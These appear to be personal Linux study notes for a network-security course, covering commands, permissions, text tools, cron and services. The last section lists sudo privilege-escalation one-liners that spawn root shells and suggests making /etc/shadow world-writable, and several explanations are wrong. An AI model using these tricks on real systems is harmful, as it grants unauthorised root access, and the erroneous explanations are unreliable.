---
date: 2024-03-30
---

> [!warning] Not strictly revised against Chinese typography
>
> This one is fairly old, and it hasn't really been revised in a long time; while the iron was hot, I gave the whole thing a pass
>
> Still, the revision is pretty poor, because my skills were limited back then and the formatting of this post was a mess. A truly strict pass against Chinese typography would be a huge amount of work and I don't have the time, so here it is as it is

## Linux Basics 1

Finally starting a new series! I'll try to get all of it done this week, but thinking about it carefully that's not realistic, since there are still math classes and data structures, and data structures really makes me want to throw up, seriously!!!! But over the next few days I'll grit my teeth and chew through it no matter what!!!!!!!!!!!!!!!

### 1.1 Introduction to Network Security

- The focus is on the server side [Windows, Linux]
  - System level
  - Software level
  - Code vulnerabilities (web vulnerabilities)
- Cyber defense exercise

### 1.2 The Origin and Introduction of Linux

- Operating system introduction                drivers
User --> software ---- OS kernel -- hardware
  System software, application software
[System kernel: Windows NT kernel]
- Operating systems:
  - Unix (born in 1969 at Bell Labs) [Ken Thompson]
  - 1970, year one of Unix
  - Apple system, 1984
  - Windows, 1985
  - Linux, 1991, Linus Torvalds, Linux kernel 1.0/GPL [can run Unix software]
    - UOS, based on Linux
    - Linux is called Unix-like (open source, follows open-source licenses)
    - Red Hat: Red Hat, Fedora, CentOS. CentOS dropped Red Hat's store software and switched to open-source replacements. The most stable enterprise server operating system: CentOS 7, CentOS 8
    - Debian: Debian, Ubuntu, Kali

### 1.3 Installing Linux

- Tsinghua University open-source software mirror site
As always, finish the configuration first, then select the iso image file

### 1.4 Connecting to Linux Remotely
Linux commands:

- View the IP address: `ip addr`
- Connect to Linux remotely: `ssh root@192.168.10.100`
- Log out: `exit`

### 1.5 Shutting Down and Rebooting Linux

- `shutdown -h now` (time)
- `reboot`

### 1.6 File Operations in Linux

- See which files are in a directory: `ls` == list
- Create a file: touch filename, such as: `touch dms.txt`
- `touch {1..10}.txt` creates ten files...
- Delete a file: `rm` filename, and you can keep stacking filenames after it [`rm b.txt c.txt` and so on]. You can put -f between rm and the filename and it won't ask yes/no anymore (short for force)
- `ctrl + c` interrupts a command
- Copy a file: `cp` (can only copy files) == copy / cp old-filename new-filename
- Rename a file: `mv` == move `mv 老文件名 新文件名`

### 1.7 Directory Operations in Linux

- Create a directory (folder): `mkdir 目录名`
- Delete a directory: rm alone won't do it `rm -f -r 目录` `rm -rf 目录`
- `cd 目录` enter a directory / `cd dms`
  - Go to the parent directory `cd ..`
- Rename a directory `mv 老文件名 新文件名`
- Copy a directory: `cp -a 老文件名 新文件名`

### 1.8 Review of File and Directory Operations

- `pwd` prints the current full directory
- Windows has several disks; Microsoft probably got it backwards: c:\windows\admins
- Other systems: / (top-level directory) `/root/dms`
  - `touch /root/4.txt`
  - `ls test09.txt` [check whether test09.txt exists]
  - `ls *.txt` [list all files ending in txt]
  - `ls -1` [display one file per line]
  - `ls -a` (all) [list all files, including hidden ones]
  - `ls -a -1` [list all files, one per line]
    - files starting with . are hidden files
  - `mv 123.txt /opt`
  - `cp 文件 /opt/`
  - `cp -a dev04 /opt/`
  - `rm /opt/123.txt`
  - `rm -f /opt/test01.txt`
  Most Linux options don't have to be in any particular order
  - `mkdir dev{1..100}`
  - `mkdir -p 1/2/3/4/5/6` [create multi-level directories]

### 1.9 The vi File Editor

- Modify file contents
  - vi has three modes
    - vi 1.txt is normal mode, where you can use lots of keyboard shortcuts
    - Edit mode, insert mode: i/a/o; press esc to go back
    - Command mode: :wq saves and quits, :q! force-quits [set number lets you see line numbers]

## Linux Basics 2

### 2.1 The CentOS 7 Graphical Interface

- Graphical interface: gui, Graphics User Interface
- Command line:   cli  command line interface
- Install the GNOME desktop; just select all the software
- You need to know how to get into root mode

### 2.2 The Linux Directory Structure

- The directory separator is `/`
- `-/` stands for the root directory
- `/bin` holds binary executables and commands; extremely important, must not be deleted
- `/boot` the files needed to boot; extremely important, must not be deleted
- `/dev` device files; extremely important, must not be deleted!
- `/etc ` holds configuration files; extremely important, must not be deleted
- `/home` the home directories of ordinary users
- `/lib library 32位库`, usually ending in so; extremely important, must not be deleted
- `/lib64 library 64位库`, usually ending in so; extremely important, must not be deleted
- `/media ` multimedia
- `/usr` stands for the usr directory under the root
- `/mnt` mount point for CDs and USB drives
- `/opt` storage directory for some installed software
- `/proc` process; extremely important, must not be deleted
- `/root` the home directory of the root user; extremely important, must not be deleted
- `/run` running; the files produced while programs run
- `/sbin` super bin, commands only the superuser can use; extremely important, must not be deleted
- `/srv` source code [source code - compile - software, executable, command]
- `/sys` system directory; extremely important, must not be deleted
- `/tmp` the directory used to hold temporary files
- `/usr` the user-level directory; extremely important, must not be deleted
- `/var` variable, changing files; extremely important, must not be deleted
- log  logs get bigger and bigger

### 2.3 Relative and Absolute Paths

- Relative path: an incomplete path, counted from the current directory
  - mkdir dms is a relative path
- Absolute path: a complete path, counted from the root
  - mkdir /dms is an absolute path
  Whether a relative path is handier or an absolute path is handier depends on the situation and on where the / comes first

### 2.4 Linux Pipes

- The `cat` command views text content from top to bottom `cat test03.txt`
- The `tac ` command views all the content of `test03.txt` backwards
- The `head` command shows 10 lines by default with nothing added, starting from the head
- The `tail` command starts from the tail (blank lines included, also 10 lines by default)
- Pipe `|` for chaining and processing `-ip addr|tail -n 4|head -n 1|cut -c 10-24`
  - Linux pipes: the most powerful feature
  - Linux: to implement something complex, several pieces of software can process it together; open and free
  - Windows: to implement something complex, you need one powerful piece of software

### 2.5 Linux User Management

- `useradd dms` (username) creates a user
- `passwd dms` changes the password
- `passwd` directly changes the root password
- Log in with a newly created user `ssh root@ip`; multiple users can log in
  - adding a user takes two commands
- `w` tells you how many terminals are open
- Terminal: Linux supports multiple users logging into one system from multiple places at the same time
- `userdel dms` deletes a user (deleting the user does not delete his home directory)
  - creating a user creates two new directories: the home directory and the mailbox
- u`sermod -L/--lock` locks a user, `-U/--unlock` unlocks a user

### 2.6 Linux Users and Passwords

- View a user's uid: id. All user information is stored in the /etc/passwd file
  - all user passwords are stored in the /etc/shadow file, which can also be overwritten to change a password

### 2.7 Linux User Groups Explained, Plus a Short Summary

- User group management
  - one-to-one, one-to-many, many-to-many
  - Create a user group `groupadd test`
  - Create a user in a specified group `useradd -g test tset1`
  - Delete a user group `groupdel 组名` (you need to delete all users in the group first)
  - Change a user's primary group `usermod -g test dms`
  - Add a user to multiple groups `usermod -g test smd`
  - `echo 123456|passwd --stdin dms`
- The first way is changing a password interactively
- The second way is changing a password non-interactively
- `lchage` checks whether it has expired

## Linux Basics 3

- `wc -l` filename counts lines
- `wc -c` filename counts characters
- `exit` 
- `logout`

### 3.1 Explaining File Read, Write and Execute Permissions
The first letter represents the file type

- Ordinary file: starts with -
- Directory file: starts with d
- Shortcut: l
- The ugo permission system: positions 2-4 are the owning user's permissions, 5-7 the owning group's permissions, 8-10 other people's permissions
- . means the current directory, .. means the parent directory
- Executables: either run them with the full path, or put them in a specific directory

### 3.2 Permissions on Files and Directories

- r 4 / w 2 / x 1 / - 0
- chmod is the command used to change file or directory permissions
- chown changes the ownership of a file or directory; the command that changes the owner and the owning group of a file or directory
File permissions -r read -w write -x execute
Directory permissions -r see which files are in the directory, x whether you can cd into the directory, w add, delete and modify the files in the directory
Default file permissions: 644, 600
Directory permissions: 755, 700

### 3.3 Linux File Attributes

- seLinux: the US National Security Agency. Especially secure -- especially troublesome. The . at position 11 above
  - sestatus shows the seLinux status
- Linux families
  - Red Hat family: Fedora, Red Hat, CentOS, EulerOS, Alibaba Anolis
  - Debian family: Ubuntu, Debian, Kali, UOS
- The number in the second column is the file's hard link count, i.e. multiple access entry points
ln original-location new-path
- Linux times
  - Access time    
  - Modify time    
  - Change time
  - stat 3.txt

### 3.4 The shell's Command Prompt

- shell is a fairly important concept in Linux
  - `hostname` changes the hostname (temporary)
  - `export PS1='[\u@\h \t \w]\$` customizable: \u user, \h hostname, \w relative path
  - `hostnamectl set-hostname` hostname (permanently changes the hostname)
  - `hostnamectl` shows host information

### 3.5 The Format of shell Commands

- shell basic syntax
  - Format 1: only one command, no arguments: ls, pwd (shows the directory), id
  - Format 2: a command with one argument: ls -l, usermod -h / --help
  - Format 3: a command with multiple arguments: ls -a -l -h == ls -alh
  - Format 4: a command with arguments and one target: ls -l /boot /rm -fr /tmp/*
  - Format 5: a command with one target: cd /tmp/ / ls /tmp/ /mkdir test
  - Format 6: a command with multiple targets: cp target1 target2
  - Format 7: a command with multiple arguments and multiple targets: ls -a -l -h /tmp /root
  cp -a -v /root /root2

### 3.6 shell Shortcuts

- tab completion for commands and paths, fast and accurate
- ctrl + a moves the cursor to the start of the command line being typed
- ctrl + e moves the cursor to the end of the command line being typed
- ctrl + c terminates the program running in the foreground
- ctrl + d in the shell, ctrl - d means exiting the current shell
- ctrl + z pauses the task and suspends it to the background; run the fg command to continue it
- ctrl + l clears the screen, equivalent to clear
- ctrl + k deletes all characters from the cursor to the end of the line
- ctrl + u deletes all characters from the cursor to the start of the line
- ctrl + r searches the command history by keyword
- ctrl + w deletes one argument backwards from the cursor
- esc + . the last argument or target of the previous command

### 3.7 shell History Commands

- `history ！+ 编号` (run a history command again) / the start of a command
- `history -c` clears the history (in memory)
- `rm -fr .bash_history` deletes the .bash_history file in the home folder

## Linux Basics 4

### 4.1 alias Explained

- Command aliases (nicknames)
- The name says it all
- There is also the unalias directive
  - `alias rm='echo 禁止删除文件'`
  - `alias `

### 4.2 vi and vim File Editors

- vim is the enhanced version of vi
  - Moving the cursor
    - h, j, k, l: left, down, up, right
    - ctrl-f page down
    - ctrl-b page up
    - ctrl-u half a page up
    - ctrl-d half a page down
    - 0 jumps to the start of the line, whether indented or not
    - ^ moves to the first character of the line
    - $  jumps to the end of the line
    - gg jumps to the start of the file
    - G jumps to the end of the file
    - 5gg/5G jumps to the fifth line
  - Deleting and copying
    - dd deletes the line the cursor is on; use u to undo, use ctrl + r to redo
    - 6dd deletes 6 lines downward starting from the cursor
    - dw deletes one word
    - paste the clipboard contents below the current line
    - paste the clipboard contents above the current line
    - yy copies the line
      - 5yy copies five lines
  - Searching and replacing
    - /pattern searches forward for the string pattern, with n and N to help
    - ?pattern searches backward for the string pattern, with n and N to help
    - u undoes directly 
    - :%s/old/new/g searches the whole file and replaces all old with new
    - :%s/old/new/gc searches the whole file and replaces all old with new, asking you to confirm each replacement; the / symbol in the middle can be replaced by any character on the top row !@#$%^&*
    - :w saves
    - :wq saves and quits
    - :x saves the changes and quits
    - :q quits, warning you if the buffer has been modified
    - :q! force-quits, discarding the changes
    - delete a single character x  also 10x

### 4.3 Linux Input/Output Redirection

- Output
  - \> redirection: the command's result is not printed to the screen but written to a file; this empties the original file
  - \>> append redirection: does not empty the original file
- Input
  - < input redirection
  - << input append redirection

### 4.4 Compressing and Decompressing Files

- `tar -zcf 压缩路径 目标1 目标2 ..`
- `tar -cf 归档路径 目标1 目标2 ..`
- `tar -zxf` decompress
- `tar -tf` view the contents of the archive
Different archive formats need different commands to decompress
- `gzip 目标1 目标2`
- `gzip -d 压缩文件1 压缩文件2`
- `zip -r 1.zip dms.txt services`
- `unzip 1.zip`
Decompressing rar archives requires installing software
- `yum install epel-release -y`
- `yum install unar -y`
- `unar -o /opt 456.rar` decompress

### 4.5 Linux File Transfer

- Linux———Linux scp transfer: both sides must be running an ssh server
- Linux———Windows: Windows can transfer one way with scp; xftp is two-way; rz-sz 
  - Download files: wget, curl
  - curl -0 download-link
  - wget download-link

## Linux Basics 5

### 5.1 Compiling and Installing nginx
Windows (commercial, closed-source) software

- A single exe file
- Portable software: idm
- Installer package
- Source code, C++, compiled

- Linux (nginx)
  -Dependency files
    - y`um install -y gcc-c++ pcre pcre-devel zlib zlib-devel openssl openssl-devel` (install the dependencies)
    - `tar xf nginx-1.20.2.tar.gz` (mmd downloads it straight from the official site and sends it over with xftp; this step decompresses it)
    - `cd nginx-1.20.2` (enter the directory)
    - auto     CHANGES.ru  configure  html     man     src
  CHANGES  conf        contrib    LICENSE  README (ls after the next two steps to see the files change)
    - auto     CHANGES.ru  configure  html     Makefile  objs    src
  CHANGES  conf        contrib    LICENSE  man       README
    - `make` (compile)
    - `make install` (install)
    - `yum install tree -y` (install tree to view files as a tree)
    - `ls /usr/local/nginx`
    - `tree /usr/local/nginx` (compare the two)
    - `systemctl stop firewalld` (stop the firewall service)
    - `systemctl disable firewalld` (disable the firewall at boot)
    - `/usr/local/nginx/sbin/nginx` (run it, then access the VM IP from the host machine)
      ```
       Welcome to nginx!
       If you see this page, the nginx web server is successfully installed and working. Further configuration is required.
      
       For online documentation and support please refer to nginx.org.
       Commercial support is available at nginx.com.
      
       Thank you for using nginx.(成功)
      ```

### 5.2 Installing with rpm and yum

- `cd /usr/local`
- `tar -zcf /tmp/nginx_dms.tar.gz nginx` (your command will use tar to pack and compress the nginx directory into the file /tmp/nginx_dms.tar.gz)
- `cd /tmp/`
- `scp nginx_dms.tar.gz root@192.168.10.3:/tmp`
Log in to another VM, enter the tmp directory and check whether the file exists
- `mv nginx_dms.tar.gz /usr/local/` (move it and go in to check)
- `tar -zxf nginx_dms.tar.gz`
- `/usr/local/nginx/sbin/nginx` 
  - redhat:rpm (redhat package manager)
  - debian:deb
   Move back to root
- `curl -o tree.rpm https://mirrors.tuna.tsinghua.edu.cn/centos/7/os/x86_64/Packages/tree-1.6.0-10.el7.x86_64.rpm`
- `rpm -ivh tree.rpm` install
- `tree` (see the result)
- `rpm -e tree` uninstall the software
- Some installation issues
  - dependencies are a pain; sometimes hundreds of them are needed, which is quite miserable
  - source compilation: customizable, but far too difficult
  - rpm: not customizable, convenient to install
  - yum: automatically resolves the rpm dependency problem (auto-configured)

### 5.3 Finding Files with find

- Basic queries
  - `find   /etc   -maxdepth 1  -type f  -name "pa*"` 
  - command   directory... search depth      type      file name

- Searching by file size (the three units k, m, g)
  - `find / -type f -size +100M` (find files larger than 100m)
  - `find /root/ngnix-1.20.2 -type f -size -2k` (find files smaller than 2k)
  - `find /type f -size +50M -and -size -100M` (find files larger than 50m but smaller than 100m)

- Access time: every time you view the file contents, the time is updated
- Modify time: when the file contents change, the time is updated
- Change time: when the file attributes (file permissions, the file's owner and group, file size) change, the time is updated
The operations are as follows
- `find /var/ -type f -mtime +1 -and -mtime -7`
- `find /var/ -type f -mmin -7` (with a + it means beyond the last seven minutes)

- Querying by user
  - `find / -group root`
  - `find / -user root`
- You can also append `-exec rm -fr {} \;`
  - `\` escape character                                                     
- `find /root -type f -name "*.cfg" -exec cp {} /tmp \;`

## Linux Basics 6

### 6.1 Process Management

- Program: a file, static
- Process: a program that is running (process)
  - `ps -ef`
- uid pid (child) ppid (parent) c stime (start time) tty
  - `yum provides pstree` (find out which package provides the pstree command)
  - `yum install psmisc-22.20-17.el7.x86_64`
- Killing processes
  - `kill pid` (use kill -9 pid with care)
  - `pkill` process command (bulk killing easily hits the wrong target...) (pkill -9 force-kills, deleting files outright)

### 6.2 Viewing Hardware and Process Information

  - `top` shows the machine's cpu, memory, processes and other information (press 1 to see how many cpus there are)
  - `free -h` the command for viewing memory
  - `df -h` the command for viewing the disk
  - `lscpu` view the cpu
    -` zombie` zombie process
- memory: memory, id: cpu usage
- swap, virtual memory: using a piece of space on the hard disk as memory

### 6.3 Scheduled Tasks

- Execute tasks (commands) on a schedule
- min $\quad$hour $\quad$day$\quad$month $\quad$week $\quad$ cmd
- 1-60  0-23  1-31  1-12   1-7   run any task
  - `crontab -l` (view scheduled tasks)
  - `crontab -e` (edit scheduled tasks)
- Scheduled task syntax
  - `* * * * * date >>/tmp/time.txt` (append redirection)
  - `cat /tmp/time.txt`
  - `tail -f /tmp/time.txt`
  - `*/5 * * * *` (print once every five minutes)
  - `01 20 1 1 *` (run the command once a year on January 1 at 8:01 p.m.)
  - `00 20 1,15 1,3,5 *` 
  - `date +%F` (year, month, day)
  - `date +%T` (hour, minute, second)
  - `date +%F\ %T` (the two above together, with the \ escape separating them by a space)
- Find a command's absolute path with the `which` command

### 6.4 Linux System Optimization

- Optimizing ssh
  - `vi /etc/ssh/sshd_config`
  - Line 79: `GSSAPIAuthentication no`
  - Line 115: `UseDNS NO`
  - `systemctl restart sshd`
- Optimizing seLinux
  - `vi /etc/seLinux/config`
  - Line 7 `SELinux=disabled`
  - `setenforce 0` takes effect immediately and is temporary
- Turning off the firewall
  - `systemctl stop firewalld`
  - `systemctl disable firewalld`
- `yum install lrzsz vim tree wget net-tools screen tcpdump bash-completion -y`
- ifconfig
  - ifconfig ens33
- `rpm -qa`
- `rpm -ql net-tools`
- Getting started with screen windows
  - View screen windows `screen -ls`
  - Restore a screen window `screen -r`
  - screen: start a new screen session.
  - `screen -S session_name`: start a new screen session and give the session a name.
  - `screen -ls`: list all currently running screen sessions.
  - `screen -r session_name`: resume/reconnect to the screen session with the specified name.
  - `screen -d session_name`: detach/disconnect the screen session with the specified name and let it run in the background.
    Shortcuts
    - Ctrl+a c: create a new window in the current screen session.
    - Ctrl+a n: switch to the next window.
    - Ctrl+a p: switch to the previous window.
    - Ctrl+a d: detach/disconnect the current screen session and return to the original terminal.
    - Ctrl+a k: close the current window or terminate the current screen session.

### 6.5 Linux Service Management

- Software:
- Client software wget, opened briefly when you use it
- Server software nginx, always running. Services: start at boot, restart the service, start the service, stop the service, service stopped, the service died, the service is down, gg

- Installing a service:
  -` yum install httpd -y`
  - `systemctl start httpd.service` start the service
  - `-systemctl status httpd.service` view the service status
  - `systemctl stop httpd.service` stop the service
  - `systemctl restart httpd.service` restart the service
  - `systemctl enable httpd.service` start at boot 
  - `systemctl disabled httpd.service ` cancel starting at boot
    Some commonly used commands
    - `start` start
    - `stop` stop
    - `restart` restart
    - `enable` set to start at boot
    - `disabled` cancel starting at boot
    - `reboot` reboot
  - Servers start automatically when power comes back on

  - `mv momomo.tar /var/www/html`
  - `cd /var/www/html`
  - `tar xf momomo.tar`
  - `systemctl restart httpd.service`
  - `192.168.10.100/moviesite-master` accessed from the host machine

## Linux Basics 7

### 7.1 Homework Walkthrough

- `crontab -e`
- `00 00 \* \* _ tar zcf /tmp/111.tar.gz /var/log/messages`
- `date -s '23:59:40'`
- `00 00 _ \* \* tar zcf /tmp/111.tar.gz /var/log/messages 2>/dev/null` (/dev/null is a special device file that discards everything written to it, which amounts to discarding the error output)
- `alias wget='echo 禁止使用 wget 下载文件'`
- `yum install php-fpm -y`
- `systemctl start php-fpm`
- `systemctl status php-fpm`
- `exec` is an option in the find command, used to run the specified command on the files that are found. Its syntax is as follows
- `find /var/ -type f -name "\*.txt" -exec rm {} \;` - this command finds all files with the .txt extension under the /var/ directory and passes every file it finds to the rm command for deletion

### 7.2 Linux Special Symbols - Comment #

- ; command separator
- .. stands for the parent directory; some vulnerabilities need cd ../../../
- . stands for the current directory
- "" double quotes, line break
- '' single quotes, line break
- View the system environment variables env
- `export LANG=en_US.UTF-8` (switch to English)
- / path separator
- \ escape character
- ` backtick, nested commands
- ! history command invocation
- - wildcard
- $ variable expansion $HISTSIZE
- `< << > >>` redirection
- || run the second command if the first fails
- && if the first fails, the second is not run either
- & run in the background
- ~ home directory

### 7.3 The Three Musketeers and Regular Expressions - Tracing Logs

`cd /var/log/`

#### 7.3 - 1 grep

- grep (good at filtering) - you can count users in /etc/passwd
- `grep 'Failed password' /var/log/secure`
- `wc -l` (count lines, bytes and so on) - options
- n line number
- c count the result lines
- i ignore case
- v reverse search, negate the match
- w exact match
- o show only the matched result
- A1 also print the line after each search result line
- B3 also print the three lines before each search result line
- C2 also print two lines above and below each search result line
- E extended regular expressions
- P use perl regular expressions
- `grep -n 'tcp' test.txt`
- `grep -c 'tcp' test.txt`
- `grep -n 'tcp' test.txt | wc -l`
- `grep -w 'tcp' test.txt`
- `grep -o 'tcp' test.txt`
- `grep -o -w -E '..p' test.txt`

#### 7.3 - 2 sed

- sed (good at modifying)
- `sed [-nri] [动作] 目标文件 -动作说明[n1[,n2]]function`
- n1 and n2 are usually line numbers
- n uses silent mode. In normal sed usage, all data coming from STDIN is usually listed on the terminal, but when the -n option is added, only the lines (or actions) that sed specially processes are listed
- r the sed actions support extended regular expression syntax (the default is basic regular expression syntax)
- i modifies the contents of the file being read directly, instead of outputting to the terminal
- function
  - `a` insert a line after the specified line
  - `d` delete
  - `i` insert a line before the specified line
  - `p` print, usually used together with the -n option above
  - `s` substitute; I is needed to ignore case, g is needed for global substitution
- `sed -i 's#3a#3#g(I)' 1.txt`
  - `sed`: the command itself.
  - `i`: means modifying the file directly.
  - `'s#3a#3#g'`: the pattern of the substitution operation, in which:
  - `s`: the command that represents the substitution operation.
  - `#`: used as the delimiter and can be replaced by other characters; the common delimiter is /.
  - `3a`: the string to be replaced.
  - `3`: the replacement string.
  - `g`: global substitution, i.e. replacing all matching strings, not just the first match.
  - `1.txt`: the name of the file to modify.

#### 7.3 - 3 awk

- awk (good at extracting columns)
- `awk '{print ($1,)$NF}' test.txt` (you can also flip it around and re-order it as $NF,$1)
- `awk '{print $1" 总价值:",&2\*$3}' 3.txt` - assignment = - comparison ==
- `awk 'NR>0 && NR<3' 3.txt`
- `awk -F ":" '{PRINT $7,$1}' /etc/passwd`
- `awk -F ":" '{print $1":123:"$7}' /etc/passwd`
- `awk -F ":" '$1~/h/{print $1,$7}' /etc/passwd` (the ones with h in the first column)


## Linux Basics 8 Regular Expressions

### 8.1 What Is a Regular Expression? 

- Simply put, a regular expression is a set of rules and methods defined for processing large amounts of strings. For example: suppose @ stands for 12345 - through regular expressions and these special symbols, we can quickly filter and replace the content we need
- Linux regular expressions generally process input in units of lines

### 8.2 Regular Expressions

- ^word means searching for content that starts with word
- word$ means searching for content that ends with word
- ^$ means a blank line, not a space
- . represents and can only represent any single character
- \ an escape character that lets a character with a special identity take off its costume and return to its original form. For example: \. only means a decimal point, restoring the original meaning of a decimal point
- _ repeats the preceding single character 0 or more times. It no longer stands for everything.
- ._ matches all characters. ^.\* starts with any number of characters
- [abc] matches any single character inside the character set [a-z]
- [^abc] ^ inside the square brackets means negation, not containing a or b or c
- {n,m} repeats the previous character n to m times
- + repeats 1 to many times
- ? repeats zero to many times
  Stenographer - conversation -- shorthand method -- restore the text
  ```
  grep '^:' passwd
  grep '^a' passwd
  grep '^b' passwd
  grep '^c' passwd
  grep '^d' passwd
  grep -v '^d' passwd
  grep 'n$' passwd
  grep -v 'n$' passwd
  ailas
  grep -o '.' 1.txt
  touch 2.txt
  vim 2.txt
  grep '\.' 2.txt
  grep -E '\.' 2.txt
  grep '\.' 2.txt
  vim 2.txt
  a 0
  b 10
  c 1
  d 1000
  e 11110000
  grep '0' 2.txt
  grep '0' 2.txt
  grep -o '0' 2.txt
  grep -o '0*' 2.txt
  grep -o '10*' 2.txt
  grep '10*' 2.txt
  grep -o '.*' 2.txt
  grep '#.\*' /etc/nginx/nginx.conf
  ```

`sed` is a stream editor used for editing and transforming text. In the `sed` command, `'s/#.*//g'` is a substitution operation, and its job is to delete the comment part of a line.

Now let's explain the specific command `'s/#.*//g'`:

- `s/`: this is the beginning of the `sed` command's substitution operator.
- `#.*`: this is a regular expression pattern that matches the comment part starting with `#` plus whatever characters follow it (`.*` means matching a sequence of any characters).
- `//`: this is the replacement part of the substitution operator; it is empty, meaning the matched part is deleted.
- `g`: this is a flag of the substitution operator meaning global substitution, i.e. replacing every place that matches, not just the first match on each line.

Taken together, the `sed 's/#.*//g' 3.txt` command deletes all the comment parts (the parts starting with `#`) on every line of the file `3.txt`, i.e. it replaces them with nothing.

For example, suppose the contents of `3.txt` are as follows:

```
This is a line of text.
# This is a commented line.
Another line of text # with a comment.
```

After running the `sed 's/#.*//g' 3.txt` command, the contents of `3.txt` become:

```
This is a line of text.

Another line of text
```
As you can see, the comment parts were successfully deleted, leaving only the uncommented text.

grep -E '[0-9.]{7,15}' secure
`grep -E '[0-9.]{7,15}' secure` is a `grep` command that matches inside the file `secure`. It uses a regular expression to find text with a particular pattern.

Now let's explain the specific command `grep -E '[0-9.]{7,15}' secure`:

- `grep` is a command used to search files for matching patterns.
- The `-E` flag means matching with extended regular expressions, which allows more regular expression metacharacters.
- `[0-9.]` is a character set that matches digits and the period (`.`) character.
- `{7,15}` is a quantifier, meaning the preceding pattern (the character set) can repeat 7 to 15 times.

Taken together, the `grep -E '[0-9.]{7,15}' secure` command searches the file `secure` for text in which 7 to 15 digit and period characters appear consecutively.

For example, suppose the contents of the `secure` file are as follows:

```
This is a secure log file.
IP address: 192.168.0.1
Invalid login attempt from 10.0.0.123
Access denied for user 203.45.67.89
```

After running the `grep -E '[0-9.]{7,15}' secure` command, the matching lines are output:

```
IP address: 192.168.0.1
Invalid login attempt from 10.0.0.123
Access denied for user 203.45.67.89
```
- As you can see, every line containing 7 to 15 consecutive digit and period characters was matched, i.e. the lines containing IP address information.
Precisely filtering IP addresses
- `grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'`
It cannot filter out invalid IP addresses `(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)`

## Linux Basics 9

The three permissions get their own separate branch later
Octal permission assignment: I'll get around to this someday

### 9.1 Linux Runlevels 

- In Linux, a runlevel is the particular mode or state the operating system is in when it boots. Each runlevel represents a set of predefined system configurations and services; it determines which processes start when the system boots and can affect the system's behavior.

- Traditionally, Linux systems use the following runlevels:
  - 0 - shutdown (system halt)
  - 1 - single-user mode (only one user is logged in, used for system maintenance and troubleshooting)
  - 2 - multi-user mode without network services (no network services provided)
  - 3 - multi-user mode, the full multi-user command-line mode (provides a complete command-line interface, including network services)
  - 4 - reserved, unused
  - 5 - multi-user mode, graphical interface mode (provides a graphical user interface, usually based on the X Window System)
  - 6 - restart (system reboot)

- Different Linux distributions may define runlevels somewhat differently. For example, some distributions may use runlevel 4 to define a different configuration, such as network services or other custom configurations.
- You can use the following commands to view the current runlevel of a Linux system:
  - View the runlevel `runlevel`
  - Switch runlevels `init`  (such as `init 6`)
  - View the runlevel `systemctl get-default`
  - Set the runlevel `systemctl set-default graphical.target` # set the default runlevel to graphical
  - Set the runlevel `systemctl set-default multi-user.target` # set the default runlevel to command line

### 9.2 Permission Masks 

- Modify the file vim /etc/profile
- root's default permission code is 022 - an ordinary user's default permission code is 002

3. Explaining the s Permission
- suid: other users get the execute permission of the file's owner
- sgid: other users get the execute permission of the file's owning group locate
- sticky, the sticky bit: for directories used jointly by many users, it makes it so that users cannot delete or change each other's files

### 9.3 su and sudo Explained

- `su==switch user`
- `sudo==superuser do`

- It's recommended to include -
  - `such as su - zhangsan` (goes straight into the root directory)

- visudo
  - after line 100, add a line
  - configure /etc/sudoers
  - zhangsan   ALL   /usr/sbin/reboot,/usr/bin/vim

- The following is vim sudo privilege escalation

- A common way to escalate privileges with `sudo` in the Vim editor is to open the file read-only and then use the `:w !sudo tee %` command to save the changes with administrator privileges.
  -The steps to do this are as follows:
  - 1. Open a terminal and enter the following command to edit the file (assuming the file name is `example.txt`): vim example.txt
  - 2. In the Vim editor, press the `Esc` key to make sure you are in command mode.
  - 3. Enter the following command to open the file read-only:
     :set readonly
        This sets the file to read-only mode, preventing a direct save.
  - 4. Enter the following command to save the file with `sudo` privileges:
     :w !sudo tee %
      This prompts you for a password for authentication. After you enter the password, Vim will save the file using the `sudo` command.
  - 5. After entering the password, press the `Enter` key. If the password is correct, Vim will save the changes with administrator privileges.
- Please note that you need to be careful when using `sudo` escalation to save files. Make sure you understand the file you are editing and the changes you are making to it. Also, be cautious when escalating with `sudo` and make sure you run commands with root privileges only when necessary.
- In addition, you can also use the `sudo vim` command in the terminal to open a file directly with administrator privileges. That way you can edit and save the file right in Vim, without a special command to escalate for saving. But you still need to operate carefully to avoid unnecessary changes.

- sudo find . -exec /bin/bash \;

- Running the `sudo find . -exec /bin/bash \;` command will run an interactive Bash shell for every file in the current directory and its subdirectories.
Let's explain the parts of this command:
  - `sudo`: this command is used to run the following command with superuser (root) privileges. It asks the user to enter a password for authentication.
  - `find .`: this command is used to find files and directories in the current directory (and its subdirectories).
  - `-exec`: this option is used to run the following command on each file found.
  - `/bin/bash \;`: this part is the command to be executed. Here we specify `/bin/bash` as the command to execute, and `\;` means terminate after the whole command has been executed.

- Through this command, `find` recursively walks through all the files in the current directory and its subdirectories and runs an interactive Bash shell for each file. This gives you an environment in which you can run commands or interact on each file. You can run arbitrary commands in the Bash shell, including browsing file contents, editing files, running other scripts and so on.

- Note that this command must be used with care, especially when running it against the whole file system. Make sure you understand the operations you are performing and that you clearly know their impact on the system. Be careful when using the `sudo` command and make sure you run commands with root privileges only when necessary.

- `sudo awk 'BEGIN {system("/bin/bash")}' test`

- Using the `sudo awk 'BEGIN {system("/bin/bash")}' test` command, you can run an interactive Bash shell through the Awk command when you have the appropriate privileges.
 Let's explain the parts of this command:
  - `sudo`: this command is used to run the following command with superuser (root) privileges. It asks the user to enter a password for authentication.
  - `awk`: this is a text processing tool that processes text files line by line and performs the corresponding operations according to the specified rules.
  - `'BEGIN {system("/bin/bash")}'`: this is an Awk script block that runs before Awk starts processing input. `system("/bin/bash")` runs the `/bin/bash` command, thereby starting an interactive Bash shell.
  - `test`: this is the input file for the Awk command.
- Through this command, the Awk command executes the specified script block and runs the `/bin/bash` command before it starts processing input, thereby starting an interactive Bash shell. You can run arbitrary commands in this Bash shell, including browsing file contents, editing files, running other scripts and so on.
- Note that this command must be used with care, especially when escalating with `sudo`. Make sure you have the appropriate privileges and that you clearly know what operations you will run in the Bash shell. Be careful when using the `sudo` command and make sure you run commands with root privileges only when necessary.

- So, damn it:
  - `cp`
  - `mv`
  - `vi`
  - `sed`
  - `chmod` change the shadow file's permissions to 777, then back to 000 once you finish editing
- All kinds of sudo privilege escalation: nothing is too imaginative for it to do
- Of course, the premise for all of it is that sudo privileges were granted (configure /etc/sudoers)
- `/etc/shadow` is an important file in Linux systems; it stores users' encrypted password information
  - `sudo -l` view the authorized commands
